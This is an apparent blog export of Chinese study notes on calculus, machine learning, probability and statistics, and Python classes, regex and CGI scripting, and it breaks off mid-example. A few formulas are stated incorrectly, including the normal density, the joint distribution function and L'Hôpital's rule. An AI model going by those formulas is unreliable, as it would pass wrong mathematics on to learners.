有|Sn-L|&lt;ℇ 4.12 极限的四则运算 加法。。。 xxx.+ xxx = L1 + L2 4.13 极限的复合 若lim f(x) = L1 x-&gt;x0 lim g(x) = L2 x-&gt;L1 则 lim g(f(x)) = L2 x-&gt;x0 4.14 连续性 f(x)在x0处连续 lim f(x) = f(x0) x-&gt;x0 若左极限与右极限不相等，则f(x)在x0点不连续 5.复杂网络经济学 5.1 用网络的思维看经济结构 从复杂网络看产业森林 5.2 复杂网络认识前后 有个公式。 重要的参数是阈值。 阈值大的话两点间不易越迁，小的话预测不好 5.3 从网络结构看不同地区 预测模拟的时候：相似度越高越容易越迁 6 机器学习 6.1 什么是机器学习 大数据时代 大数据时代1.0:数据的积累和呈现 大数据时代2.0:机器学习：用历史数据预测未来 DT时代数据即财富 机器学习给数据赋予价值 -- 机器学习（偏技术） -- 神经网络。 ---深度学习 人工智能 -- 数据挖掘（偏应用，站在商业角度） -- 知识表示，推理，自然语言处理，感知。。 在试错中学习 6.2 机器学习的类型 监督学习：通过已有的训练样本（即已知数据以及其对应的输出）来训练，从而得到一个最优模型，再利用这个模型将所有新的 数据样本映射为相应的输出结果，对输出结果进行简单的判断从而实现分类的目的，那么这个最优模型也就具有了对未知数据进行分类的能力 无监督学习：我们事先没有任何训练数据样本，需要直接对数据进行建模 监督学习（反馈及时）VS强化学习（反馈不及时） 达到的是预测结果足够和真实结果接近 因素：叫做特征。（影响预测的关键因素） 泛化算法 reg（线性回归）： Y= w1a + w2b + w3c w: 权重 a,b,c：特征因素 6.3 简单回归 （接上） 监督学习： def estimate_house_sales_price(num_of_bedrooms,sqft,neightborhood): price = 0 if .... 怎么找权重： 用计算机找 第一步：把每个权重都设置为1 第二步：将每栋房产带入你的函数运算，检验估算值与正确价格的偏离程度。 例如：上表中第一套房产实际成交价为25万美元，你的函数估价为17.8万，相差了7.2万，这个时候要将你的数据集中的 每套房产估价偏离值平方后求和。假设一共有500套房，则其平方求和总计为xxx，除以500的到平均误差值。该平均误差值称为函数的代价。 **如果你能调整权重使得这个代价变为0，你的函数就完美了。 第三步：不断重复第二步，尝试所有可能的权重值组合。哪一个组合使得代价最接近于0，它就是你要使用的。 Cost = (求和(i1-i2))^2/500/2. 为什么会除以2呢？ 为了后面方便求导 怎么找到最优秀的权重值？ 将其(reg:cost)在空间上表示出来 先仅考虑2个特征的权重,x,y，然后z轴来表示cost值。 然后找z轴最低点 寻找遍历最短的途径。。。即开始点到z轴最低点的最短路线，即变为了求梯度问题 解决其他不相干因素造成的偏倚： 如果w1与w2有线性关系，则有时候会出现不唯一的结果。还易出现过拟合。解决方法：引入范数。 （新加入数据后，会采用随机梯度法） 过拟合：即把一份数据分成几个子数据，用子数据来进行预测的，则其不能用为另外的数据集上。 （经常见，原因即样本永远不是一个完整的样本） 1）引入假设可以有效减少过拟合。 2）分割成训练集和测试样本集（用测试样本来检验是否过拟合） 贝叶斯分析 7. 阿尔法狗和强化学习 7.1 人工智能的发展： min-max算法 围棋与象棋的区别 解决穷举法的办法：强化学习，让机器来举一反三。。 7.2 强化学习算法 环境元素 决策/行为 观测 反馈 行为者 以围棋为例： 马尔可夫决策树 Action State -&gt;Reword(奖励) 永远是从当下指向当下 策略与估值函数 要考虑所有时刻的奖励 要引入监督学习 马尔可夫决策树+DL https://github.com/RochesterNRT/RocAlphaGo/blob/develop/AlphaGo/mcts.py RL. : 强化学习 SL：监督学习 UL：无监督学习 正确+1分，错误-1分 启示： 1.目标明确 2.规则明确 3.信息完全 这样的游戏是机器学习可以玩的游戏 为什么炒股不能拿来当人工智能：炒股的规则，反伸性，信息不明确，对手还会伪装 生存策略： 提高效率 数据思维 专业知识 7.6 无监督学习 推荐算法 8 高数-两个重要的极限定理 8.1 回顾 IR。实数 取反方式从Q构建IR 8.2 （一） lim(1+1/n)^n = e n-&gt;∞ lim(sinx/x) = 1 x-&gt;0 证明方法：二项式展开，单调递增 夹逼定理：（三角函数，导数的证明相关） lim f(x) = L x-&gt;x0 lim g(x) = L x-&gt;x0 且在(x1,x2)内，x1&lt;x0&lt;x2 有f(x) &lt;= k(x) &lt;= g(x) =&gt; lim k(x) = L x-&gt;x0 9 高数-导数 9.1 定义 f`(x) = lim f(x)-f(x0) / x-x0 x-&gt;x0 特例： 处处连续且处处不可导 初等函数的导数： (x^n)` = n x^ n-1 (n != 0) (e^x)` = e^x sin`x = cos x ... 反函数的导数： 自变量因变量互换就是反函数 f` = lim ∆y/∆x g` = lim ∆x/∆y f`(x)g`(y) = 1 arcsin`x = 1/ (cos(arcsinx)) arctan`x = 1/ 1+x^2 ln`x = 1 / x 所有初等函数： sinx ,cosx,tanx,arcsinx,arccosx,arctanx,x^n,e^x,ln x 复合函数的导数： g`(f(x)) = g`(f) * f`(x) k = e^ ln k 9.6 泰勒展开 f(x) = f(x0) + f`(x0)(x-x0)/1! + f&apos;&apos;(x0)(x-x0)^2 / 2! + ... 在x0处会得出展开范围内的任意值 典型项： f(n) (x0)(x-x0)^n / n! f(n) ---- f的n次导 9.7 罗尔定理 (为了证明洛比塔法则) y = f(x) 在闭区间【a,b】内可导，且f(a) = f(b) 则一定存在c， c属于（a,b) f&apos;(c) = 0 9.8 微分中值定理和柯西中值定理 微分中值定理 f(x)在[a,b]可导，那么一定存在c f&apos;(c) = f(b) - f(a) / b-a 柯西中值定理 f(x),g(x)在[a,b]可导，且g(x) != 0 则一定存在c。 f(b)-f(a) / g(b)-g(a) = f&apos;(c)/g&apos;(c) 9.9 洛比塔法则 lim f(x) = 0 , lim g(x) = 0 x-&gt;a x-&gt;a 有 lim f(x)/g(x) = lim f&apos;(a)/g&apos;(a) x-&gt;a x-&gt;a 10. 贝叶斯理论 10.1 梯度优化 数据通常用.csv保存，可以用excel打开，也可以用python打开 jupyter 机器学习都需要通过代价函数转化为优化问题 解决的最简单的方法：遍历 图上各个点即构成了代价函数 Gradient（梯度） G = [cos(t)]&apos; / x&apos; 一维的话是指变化的速率 二维的话（即x,y,z)，导数分偏x导数，与偏y导数 ，，寻找在哪个方向是最快的（reg：下降的方向（reg：加负号）） 步幅（步伐）。与 梯度的模长成正比。 在距离目标较远时，步伐较大，越接近时，步伐较小 10.3 概率基础 监督学习：有标准答案的试错学习 无监督学习：根据一定的假设寻找数据内部的结构 强化学习：延迟满足，根据结果调整行为 衡量模式的方法-概率论 Probability is common sense reduced to calculation. 机器学习问题随机性的来源： 问题内在的不确定性 信息不完全 模型所能考虑的特征有限 模型本身永远脱离真实 概率与事件： 1.试验 2.事件 3.概率空间 4.概率运算 4.1 A∪B 4.2 A∩B 4.3 ！A = 1 - P(A) 4.4 P(A | B) P(B|A) = P(A,B) / P(A) P(B|A) 独立 = P(B) P(A) = P(A | B)P(B) + P(A|!B)P(!B) 10.5 贝叶斯推理 P(A,B) = P(A|B)P(B) P(B,A) = P(B|A)P(A) -&gt; P(A|B) = P(B|A)P(A) / P(B|A)P(A)+P(B|!A)P(!A) 贝叶斯公式 P(A) --- 先验概率 P(A|B) -- 后验概率 B -- 证据 A -- 事件 证据 -- 数据 **根据数据更新对事件可能性的估计 贝叶斯代表的是主观概率 10.8 辛普森案件]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>算法/分析</category>
        <category>人工智能</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>人工智能</tag>
        <tag>python</tag>
        <tag>分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[统计学学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[03 统计学 //note 01 如果有一个很大的极端值，则均值考虑会很不科学 极差：简单地描述数据的范围大小，表示离散程度 方差： 标准差：有效地避免了因单位平方而引起的度量问题，与方差一样，标准差的值越大，表示数据越分散 直方图 频数分布表 频数直方图 频率直方图（常用） 纵坐标：频率/组距 组距就是分组的极差 箱线图 四分位数:Q1，将所有数据按照从小到大的顺序排序排在第25%位置的数字 上四分位数:Q3，将所有数据按照从小到大的顺序排序排在第75%位置的数字 四分位距:IQR，等于Q3-Q1，衡量数据离散程度的一个统计量 异常点:小于Q1-1.5IQR或大于Q3+1.5IQR的值 上边缘:除异常点以外的数据中的最大值 下边缘:除异常点以外的数据中的最小值 箱线图简单画法: reg：8 23 7 4 9 6 9 4 3 1. 排序:2 3 3 4 4 6 7 8 9 9 2. 找出中位数:(4+6)/2=5 3. 分别找出前半部分不后半部分的中位数——下四分位数不上四分位数:3与8 4. 判断异常点:3-1.5*(8-3)=-4.5;8+1.5*(8-3)=15.5;没有异常点 5. 找出最大值不最小值:2不9 6. 在3到8之间画一个箱子，分别用箭头指向2,9 异常点用空心圆标出 茎叶图 茎叶图可以在保留全部数据信息的情况下，直观地显示出数据的分布情况 简单画法: 53 53 59 61 61 63 65 67 67 69 69 69 70 70 71 74 75 75 76 77 78 79 80 81 81 81 81 82 84 85 86 87 87 87 88 89 90 91 91 94 95 1. 将数据分为茎和叶两部分，这里的茎是指十位上的数字，叶是指个位上的数字 2. 将茎部分(十位)从小到大，从上到下写出来 3. 相对于各自的茎，将同一茎(十位)的叶子(个位)从小到大，从左往右写出来 线图 以时间为横坐标，变量为纵坐标，反映变量随时间推移的变化趋势 柱形图 柱形图:显示一段时间内的数据变化或显示各项之间的比较情况（可以比较组内情况） 柱形图与直方图比较： 从横坐标看，直方图是同一个变量的分组划分，而柱形图则是不同的组别 从作用上看，直方图用于显示一组数据的分布情况，而柱形图则是用于比较不同组别的数据差异 饼图 //note 02 总体方差 样本方差 （除数为n-1） 分位数 四分位数的选择具有争议性 分位数的数学定义： 选择四分位的百分比值y，及样本总量n，分位数的位置可以由下面的公式计算： Ly = n * (y/100) 情况1:如果L是一个整数，则取第L和第L+1的平均值 情况2:如果L不是一个整数，则取下一个最近的整数（比如1.25，则取2） 随机试验 3个特点： 1. 可以在相同的条件下重复进行 2. 试验的可能结果不止一个，但在试验前可以知道所有可能结果 3. 试验前不能确定哪个结果会出现 样本空间，样本点 对于随机试验E，E的所有可能结果组成的集合称为E的样本空间，记为S。其中，S中的 元素，即E的每个可能结果，称为样本点。 S={范围} 事件 随机事件 基本事件 由一个样本点组成的单点集 事件发生 必然事件 不可能事件 事件关系 包含，和，积，差，互斥，逆 事件运算定律 交换律 A ∩ B = B ∩ A；A ∪ B = B ∪ A 结合律 A ∪ (B ∪ C) = (A ∪ B) ∪ C;A ∩ (B ∩ C) = (A ∩ B) ∩ C 分配律 A ∪ (B ∩ C) = (A ∪ B) ∩ (A ∪ C) A ∩ (B ∪ C) = (A ∩ B) ∪ (A ∩ C) 德摩根律： 频数 频率 概率：（需要满足的条件） 1.非负性：P(A) &gt;= 0 2.规范性: 对于必然事件S，有P(S)=1 3.可列可加性 性质： 1.P(∅)=0 不可能事件发生的概率为0 2.有限可加性 3.对于A，B两个事件，若A⊃B,则P(A-B)=P(A)-P(B);P(A)&gt;=P(B) 4.对于任一事件A，有P(A)&lt;=1 5.对于任一事件A，有P(A(逆))=1-P(A) 6.对于A，B两个事件，有P(A ∪ B)=P(A)+P(B)-P(AB)(称为加法公式) Buffon投针实验 𝛑的估算 古典概型 1. 试验的样本空间只包含有限个元素 2. 试验中每个基本事件发生的可能性相同，即每个基本事件发生的概率相等 则称这样的试验E为古典概型，也叫等可能概型 例如：抛硬币，抛骰子等 排列组合 A3 9(从上往下,3,9) = 9*8*7 C3 9 = 9*8*7 / 3*2*1 实际推断原理： 概率很小的事件在一次试验中实际上几乎是不发生的 几何概型 1. 试验的样本空间包含无限个元素 2. 试验中每个基本事件发生的可能性相同，即每个基本事件发生的概率相等 P(A)=构成事件A的区域长度(面积或体积)/实验的全部结果所构成的区域长度(面积或体积) //note 03 条件概率 已知某个事件A发生的条件下，另一个事件B发生的概率称为条件概率，记为P(B|A) P(B|A)=P(AB)/P(A) 乘法定理 P(AB)=P(B|A)P(A),其中P(A)&gt;0 -&gt;P(ABC)=P(C|AB)P(B|A)P(A)=P(A|BC)P(B|C)P(C) 全概率公式 P(A)=P(A|B1)P(B1)+P(A|B2)P(B2)+...+P(A|Bn)P(Bn) B1...Bn 是样本空间S的划分 划分 贝叶斯公式： 设试验E的样本空间为S。A为E的一个事件，B1，b2.....Bn是S的一个划分，且P(A)&gt;0,P(Bi)&gt;0(i=1,2,....,n),则 P(Bi|A)=P(ABi)/P(A)=P(A|Bi)P(Bi)/(j=1 n累加)P(A|B1)P(B1)+P(A|B2)P(B2)+...P(A|Bj)P(Bj) 贝叶斯公式的应用——--垃圾邮件判别 原理:若已知某些字词经常出现在垃圾邮件中，却很少出现在合法邮件中，当一封邮 件含有这些字词时，那么他是垃圾邮件的可能性就很大。 (1)创建基于字词符号的贝叶斯数据库——--垃圾邮件不非垃圾邮件 (2)创建贝叶斯概率库——--垃圾概率 (3)创建个性化的贝叶斯库——--根据个人需求更改先验概率 公式比较 乘法公式、全概率公式与贝叶斯公式 1 乘法公式是求“几个事件同时发生”的概率; 2 全概率公式是求“最后结果”的概率; 3 贝叶斯公式是已知“最后结果” ，求“某个事件”的概率. 先验概率与后验概率 1 P(Bj|A)是在事件A发生的条件下, 某个事件Bj发生的概率, 称为 “后验概率”; 2 Bayes公式又称为“后验概率公式”或“逆概公式”; 3 称P(Bj) 为“先验概率”. 独立性 设A，B是两个事件，如果满足：P(AB)=P(A)P(B),则称事件A，B相互独立。简称A，B独立。 -- A(逆)与B(逆)也相互独立 多事件相互独立 多个事件相互独立!=多个事件两两独立 相互独立事件与互斥事件，对立事件 互斥事件与对立事件都不是相互独立事件 //note04 随机变量----Random Variable 定义：设随机试验的样本空间为S={e},X=X(e)是定义在样本空间S上的实值单值函数，称X=X(e)为随机变量 离散(Discrete)型随机变量 连续(Continuous)型随机变量 取值概率 对于离散型随机变量，随机变量的每一个取值都一定的概率 分布律 (0-1)分布/两点分布 伯努利试验 n重伯努利试验：将一个伯努利试验独立地重复n次的一串重复的独立试验 二项分布 泊松分布 (p&lt;=0.1时，可以直接用它来代替二项分布)(n&gt;=20,p&lt;=0.05) 概率密度分布图 分布函数 对于连续型随机变量，由于其可能的取值不能一一列出，所以就不能像离散型随机变量那样使用分布律去描述它。这时我们需要更加通用的描述方式--分布函数 设X是一个随机变量，x是任意实数，函数F(x)=P(X&lt;=x)称为X的分布函数(累积分布函数)(英文简写CDF) 性质： 1.F(x)是一个不减函数 2.0&lt;=F(x)&lt;=1,且F(-∞)=lim x-&gt;∞F(x)=0; F(∞)=lim x-&gt;∞ F(x) = 1 3.F(x)是右连续的 连续型随机变量的分布函数 连续型随机变量 严格定义: 对于随机变量X的分布函数F(x)，存在非负可积函数f(x)，使对于任意实数x有 F(x)= ∫x -∞ f(t)dt 则称X为连续型随机变量，f(x)称为X的概率密度凼数 ( Probability Density Function )，简称概率密度(PDF) 概率密度 性质： 1.f(x) &gt;=0 2.∫∞ -∞ f(x)dx = F(∞) = 1 3.对于任意实数X1,X2(X1&lt;=X2),P{X1&lt;=X&lt;=x2}=F(x2)-F(x1)=∫x2 x1 f(x)dx 4.若f(x)在点x处连续，则有F&apos;(x)=f(x) 均匀分布 若连续函数X具有概率密度f(x)={1/(b-a),a&lt;x&lt;b ; 0,其他，则称X在区间(a,b)上服从均匀分布，记为X~U(a,b) 正态分布 若连续型随机变量X的概率密度为f(x)=1/(√(2𝝿𝛔)e)^(-(x-𝛍)^2/2𝛔^2),-∞&lt;x&lt;∞，则称X服从参数为𝛍,𝛔^2的正态分布，记为X～N(𝛍,𝛔^2) 性质： 1.曲线关于x=u对称 2.当x=u时，概率密度函数可以取得最大值f(x)=1/(√(2𝝿𝛔)) 3.在具有同样长度的区间中，当区间离u越远，X落在区间的概率越小 (𝛔^2越大越窄，u负数左移) 标准正态分布 u=0,𝛔^2=1时，为标准正态分布 标准正态分布查表 正态分布-&gt;标准正态分布 二项分布与正态分布 二项分布是离散情况下的正态分布 当n足够大时，可以用正态分布近似二项分布，从而避免二项分布中繁杂的计算 若X～B(n,p)，当n足够大时，有X近似服从正态分布N(np,np(1-p)) 导数 求导公式 不定积分 简单定积分 牛顿——莱布尼兹公式: ∫b a f(x)dx=F(x)|b a = F(b)-F(a) 其中，F(x)为f(x)的原函数，即𝐹′(𝑥) = 𝑓(𝑥) 分部积分公法: 设u(x)、v(x)在[a,b]上具有连续导数u&apos;(x),v&apos;(x)，则 ∫b a u(x)dv(x) = u(x)v(x)|b a - ∫b a v(x)du(x) 二维随机变量(或向量) 一般，设E是一个随机试验，它的样本空间是S={e}，设X=X{e}和Y={e}是定义在S上的 随机变量，由X与Y构成的向量(X,Y)叫做二维随机向量或是二维随机变量(Two- dimensional random vector) 二维随机变量的分布函数： 联合分布函数： 设(X,Y)是二维随机变量，对于任意实数x，y，二元函数: F(x,y)=P{(X≤x)∪(Y≤y)}=P{X≤x,Y≤y} 称为二维随机变量(X,Y)的联合分布函数(Joint probability distribution) 性质： 1. F(x,y)是对于x和y的不减函数，即 x1&lt;x2 =&gt; F(x1,y)&lt;=F(x2,y) y1&lt;y2 =? F(x,y1)&lt;=F(x,y2) 2. 0≤F(x,y)≤1，且对于任意固定的y，F(-∞，y)=0;对于任意固定的x，F(x，-∞)=0 F(-∞，-∞)=0，F(∞，∞)=1 3. F(x，y)关于x右连续，关于y右连续，即 lim ℇ-&gt;0+ F(x+ℇ, y)=F(x, y) lim ℇ-&gt;0+ F(x, y+ℇ)=F(x, y) 4. 对于任意(x1,y1),(x2,y2),x1&lt;x2,y1&lt;y2,下述不等式成立: F(x2,y2)-F(x2,y1)+F(x1,y1)-F(x1,y2)≥0 (积分的时候是上限值-下限值) 离散型的二维随机变量 如果二维随机变量(X,Y)全部可能取到的值是有限对或是可列无限对，则称(X,Y) 为离散型的二维随机变量。 连续型的二维随机变量 如果对于二维随机变量(X,Y)的分布函数F(x,y)，存在非负可积函数f(x，y)使得对 于任意x,y有 F(x,y)=∫x -∞∫y -∞ f(v,v)dudv 称(X,Y)为连续型的二维随机变量。 联合概率密度 性质： 1. f(x,y)≥0 2. ∫∞ -∞ ∫∞ -∞ 𝑓(𝑥,𝑦)𝑑𝑥𝑑𝑦=𝐹(∞,∞) =1 3. 4. 多维随机变量 边缘分布 在多维随机变量中，将X，Y各自的分布称为边缘分布函数 边缘分布律 边缘分布律具有一维分布律的性质 联合分布律唯一决定边缘分布律. 具体求法是将联合分布律写成表格形式, 然后各行分 别相加得关于X的分布律;各列相加得Y的分布律 边缘概率密度 条件分布 条件分布律 条件概率密度 条件分布函数 各种分布的关系 联合分布可以唯一地确定边缘分布和条件分布 随机变量的独立性 //note06 离散型随机变量的数学期望 绝对收敛 随机变量的期望值=均值 二项分布的数学期望 连续型随机变量的数学期望 E(X) = ∫∞ -∞ xf(x)dx //第6周 stat06b 03:00]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>统计学</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>分析</tag>
        <tag>统计学</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fpython%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[python学习： class Employee: empCount = 0 def __init__(self,name,salary): self.name = name self.salary = salary Employee.empCount += 1 def displayCount(self): print &quot;Total Employee %d&quot; % Employee.empCount self代表类的实例，而非类。是必须有的 t = Employee() t.displayCount() 添加/修改/删除属性： t.age = 7 t.age = 8 del t.age getattr(obj, name[, default]) : 访问对象的属性。 hasattr(obj,name) : 检查是否存在一个属性。 setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。 delattr(obj, name) : 删除属性。 python内置类属性： __dict__:类的属性（包含一个字典，由类的数据属性组成） __doc__:类的文档字符串 __name__:类名 __module__:类定义所在的模块 __bases__:类的所有父类构成元素 类的继承： class Parent: class Mother: class Child(Parent,Mother): (可以继承多个类) 类的属性/方法私有： class JustCounter: __secretCount = 0 # 私有,实例化后不能访问私有变量 publicCount = 0 # 公开 __foo__: 定义的是特殊方法，一般是系统定义名字 ，类似 __init__() 之类的。 _foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import * __foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。 python正则表达式： re模块 import re print(re.match(&apos;www&apos;, &apos;www.runoob.com&apos;).span()) # 在起始位置匹配 print(re.match(&apos;com&apos;, &apos;www.runoob.com&apos;)) # 不在起始位置匹配 reg： #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2) else: print &quot;No match!!&quot; 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter re.search: import re print(re.search(&apos;www&apos;, &apos;www.runoob.com&apos;).span()) # 在起始位置匹配 print(re.search(&apos;com&apos;, &apos;www.runoob.com&apos;).span()) # 不在起始位置匹配 re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 import re phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&apos;#.*$&apos;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num # 删除非数字(-)的字符串 num = re.sub(r&apos;\D&apos;, &quot;&quot;, phone) print &quot;电话号码是 : &quot;, num pattern : 一个字符串形式的正则表达式 flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为： re.I 忽略大小写 re.L 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境 re.M 多行模式 re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） re.U 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和 # 后面的注释 &gt;&gt;&gt;import re &gt;&gt;&gt; pattern = re.compile(r&apos;\d+&apos;) # 用于匹配至少一个数字 &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;) # 查找头部，没有匹配 &gt;&gt;&gt; print m None &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;, 2, 10) # 从&apos;e&apos;的位置开始匹配，没有匹配 &gt;&gt;&gt; print m None &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;, 3, 10) # 从&apos;1&apos;的位置开始匹配，正好匹配 &gt;&gt;&gt; print m # 返回一个 Match 对象 &lt;_sre.SRE_Match object at 0x10a42aac0&gt; &gt;&gt;&gt; m.group(0) # 可省略 0 &apos;12&apos; &gt;&gt;&gt; m.start(0) # 可省略 0 3 &gt;&gt;&gt; m.end(0) # 可省略 0 5 &gt;&gt;&gt; m.span(0) # 可省略 0 (3, 5) group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group))。 &gt;&gt;&gt;import re &gt;&gt;&gt; pattern = re.compile(r&apos;([a-z]+) ([a-z]+)&apos;, re.I) # re.I 表示忽略大小写 &gt;&gt;&gt; m = pattern.match(&apos;Hello World Wide Web&apos;) &gt;&gt;&gt; print m # 匹配成功，返回一个 Match 对象 &lt;_sre.SRE_Match object at 0x10bea83e8&gt; &gt;&gt;&gt; m.group(0) # 返回匹配成功的整个子串 &apos;Hello World&apos; &gt;&gt;&gt; m.span(0) # 返回匹配成功的整个子串的索引 (0, 11) &gt;&gt;&gt; m.group(1) # 返回第一个分组匹配成功的子串 &apos;Hello&apos; &gt;&gt;&gt; m.span(1) # 返回第一个分组匹配成功的子串的索引 (0, 5) &gt;&gt;&gt; m.group(2) # 返回第二个分组匹配成功的子串 &apos;World&apos; &gt;&gt;&gt; m.span(2) # 返回第二个分组匹配成功的子串 (6, 11) &gt;&gt;&gt; m.groups() # 等价于 (m.group(1), m.group(2), ...) (&apos;Hello&apos;, &apos;World&apos;) &gt;&gt;&gt; m.group(3) # 不存在第三个分组 Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; IndexError: no such group findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。 # -*- coding:UTF8 -*- import re pattern = re.compile(r&apos;\d+&apos;) # 查找数字 result1 = pattern.findall(&apos;runoob 123 google 456&apos;) result2 = pattern.findall(&apos;run88oob123google456&apos;, 0, 10) print(result1) print(result2) 输出结果： [&apos;123&apos;, &apos;456&apos;] [&apos;88&apos;, &apos;12&apos;] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 # -*- coding: UTF-8 -*- import re it = re.finditer(r&quot;\d+&quot;,&quot;12a32bc43jf3&quot;) for match in it: print (match.group() ) 输出结果： 12 32 43 3 re.split split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 &gt;&gt;&gt;import re &gt;&gt;&gt; re.split(&apos;\W+&apos;, &apos;runoob, runoob, runoob.&apos;) [&apos;runoob&apos;, &apos;runoob&apos;, &apos;runoob&apos;, &apos;&apos;] &gt;&gt;&gt; re.split(&apos;(\W+)&apos;, &apos; runoob, runoob, runoob.&apos;) [&apos;&apos;, &apos; &apos;, &apos;runoob&apos;, &apos;, &apos;, &apos;runoob&apos;, &apos;, &apos;, &apos;runoob&apos;, &apos;.&apos;, &apos;&apos;] &gt;&gt;&gt; re.split(&apos;\W+&apos;, &apos; runoob, runoob, runoob.&apos;, 1) [&apos;&apos;, &apos;runoob, runoob, runoob.&apos;] &gt;&gt;&gt; re.split(&apos;a*&apos;, &apos;hello world&apos;) # 对于一个找不到匹配的字符串而言，split 不会对其作出分割 [&apos;hello world&apos;] python CGI编程： CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端HTML页面的接口 Web服务器支持及配置 在你进行CGI编程前，确保您的Web服务器支持CGI及已经配置了CGI的处理程序。 Apache 支持CGI 配置： 设置好CGI目录： ScriptAlias /cgi-bin/ /var/www/cgi-bin/ 所有的HTTP服务器执行CGI程序都保存在一个预先配置的目录。这个目录被称为CGI目录，并按照惯例，它被命名为/var/www/cgi-bin目录。 CGI文件的扩展名为.cgi，python也可以使用.py扩展名。 如果你想指定其他运行 CGI 脚本的目录，可以修改 httpd.conf 配置文件，如下所示： &lt;Directory &quot;/var/www/cgi-bin&quot;&gt; AllowOverride None Options +ExecCGI Order allow,deny Allow from all &lt;/Directory&gt; 在 AddHandler 中添加 .py 后缀，这样我们就可以访问 .py 结尾的 python 脚本文件： AddHandler cgi-script .cgi .pl .py 第一个CGI程序 我们使用Python创建第一个CGI程序，文件名为hello.py，文件位于/var/www/cgi-bin目录中，内容如下： #!/usr/bin/python # -*- coding: UTF-8 -*- print &quot;Content-type:text/html&quot; print # 空行，告诉服务器结束头部 print &apos;&lt;html&gt;&apos; print &apos;&lt;head&gt;&apos; print &apos;&lt;meta charset=&quot;utf-8&quot;&gt;&apos; print &apos;&lt;title&gt;Hello World - 我的第一个 CGI 程序！&lt;/title&gt;&apos; print &apos;&lt;/head&gt;&apos; print &apos;&lt;body&gt;&apos; print &apos;&lt;h2&gt;Hello World! 我是来自菜鸟教程的第一CGI程序&lt;/h2&gt;&apos; print &apos;&lt;/body&gt;&apos; print &apos;&lt;/html&gt;&apos; 文件保存后修改 hello.py，修改文件权限为 755 在浏览器访问 http://localhost/cgi-bin/hello.py 以下表格介绍了CGI程序中HTTP头部经常使用的信息： 头 描述 Content-type: 请求的与实体对应的MIME信息。例如: Content-type:text/html Expires: Date 响应过期的日期和时间 Location: URL 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源 Last-modified: Date 请求资源的最后修改时间 Content-length: N 请求的内容长度 Set-Cookie: String 设置Http Cookie 以下是一个简单的CGI脚本输出CGI的环境变量： #!/usr/bin/python # -*- coding: UTF-8 -*- # filename:test.py import os print &quot;Content-type: text/html&quot; print print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;&quot;; print &quot;&lt;ul&gt;&quot; for key in os.environ.keys(): print &quot;&lt;li&gt;&lt;span style=&apos;color:green&apos;&gt;%30s &lt;/span&gt; : %s &lt;/li&gt;&quot; % (key,os.environ[key]) print &quot;&lt;/ul&gt;&quot; GET方法发送编码后的用户信息到服务端，数据信息包含在请求页面的URL上，以&quot;?&quot;号分割, 如下所示： http://www.test.com/cgi-bin/hello.py?key1=value1&amp;key2=value2 GET 请求可被缓存 GET 请求保留在浏览器历史记录中 GET 请求可被收藏为书签 GET 请求不应在处理敏感数据时使用 GET 请求有长度限制 GET 请求只应当用于取回数据 以下为hello_get.py文件的代码： #!/usr/bin/python # -*- coding: UTF-8 -*- # filename：test.py # CGI处理模块 import cgi, cgitb # 创建 FieldStorage 的实例化 form = cgi.FieldStorage() # 获取数据 site_name = 